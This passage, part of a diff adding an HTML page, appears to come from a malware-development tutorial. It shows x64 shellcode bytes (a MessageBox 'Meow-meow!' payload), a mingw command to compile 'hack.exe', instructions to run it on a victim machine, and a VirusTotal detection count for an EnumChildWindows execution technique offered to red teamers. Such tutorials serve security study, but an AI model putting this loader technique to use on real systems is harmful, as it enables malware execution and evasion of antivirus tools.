+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. Compile our “malware”: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \ -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections \ -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and run in our victim’s machine: .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, everything is work perfectly :) Let’s go to upload hack.exe to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, 20 of 69 AV engines detect our file as malicious. https://www.virustotal.com/gui/file/71c4294f90d6d6c3686601b519c2401a58bb1fb0 3ab9ca3975eca7231af77853/detection I hope this section spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. EnumChildWindows source code in github</p></main></body></html>
